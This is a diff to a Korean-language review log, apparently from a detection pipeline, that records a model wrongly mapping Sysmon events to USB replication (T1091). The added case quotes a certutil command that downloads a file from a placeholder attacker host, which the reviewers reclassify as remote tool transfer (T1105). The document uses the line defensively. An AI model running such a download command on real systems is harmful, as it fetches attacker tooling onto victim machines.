@@ -51,10 +51,10 @@ decided:
     artifacts: [evtx:Sysmon]
     verdict: model_wrong
     decided_on: "2026-09-04"
-    case: K-LIVE-0902-wide, K-LEDGER-0905
+    case: K-LIVE-0902-wide, K-LEDGER-0905, K-LIVE-KIOSK-MYTEST
     note: |
-      두 실행에서 같은 방식으로 틀렸다. 둘 다 정상 소프트웨어의 자기 관리
-      동작을 USB 복제(T1091)로 읽었다.
+      세 실행에서 같은 방식으로 틀렸다. 앞의 둘은 정상 소프트웨어의 자기
+      관리 동작을, 셋째는 외부 다운로드를 USB 복제(T1091)로 읽었다.
 
       K-LIVE-0902-wide F3 — "cmd.exe 가 실행됐고 이는 VMware Tools 스크립트를
       실행한 T1091". 인용한 SYSMON#2130·#2134 는 Wazuh 에이전트의 자기 재시작
@@ -64,7 +64,15 @@ decided:
       resume-vm-default.bat 실행 둘이 더 붙었다. **레코드는 제대로 읽고
       기법만 틀렸다** — 오배정 부류이고, 06 이 잡는 것이 맞다.
 
-      둘 다 USB 와 무관하므로 기각이 옳다. 매핑을 넓히지 않는다.
+      K-LIVE-KIOSK-MYTEST (2026-09-08) — 인용한 SYSMON#22236 은
+      `certutil -urlcache -split -f http://<공격자>:8000/...` 다. 04 가
+      `lolbin_download` 로 판정해 05 에 배달한 바로 그 레코드이고, 매핑상
+      이것은 T1105(원격 도구 전송)다. **레코드 선택은 옳았고 붙인 기법만
+      틀렸다** — 앞의 둘과 같은 오배정 부류다. 신고 서술에 USB 삽입이
+      있었다는 것은 T1091 을 붙일 근거가 아니다. 증거가 말하는 것은
+      네트워크 다운로드다.
+
+      셋 다 USB 와 무관하므로 기각이 옳다. 매핑을 넓히지 않는다.
 
       다만 이것이 T1091 에 evtx:Sysmon 이 필요 없다는 뜻은 아니다. USB 에서
       실행된 파일은 Sysmon EID 1 의 Image 가 이동식 드라이브를 가리키므로
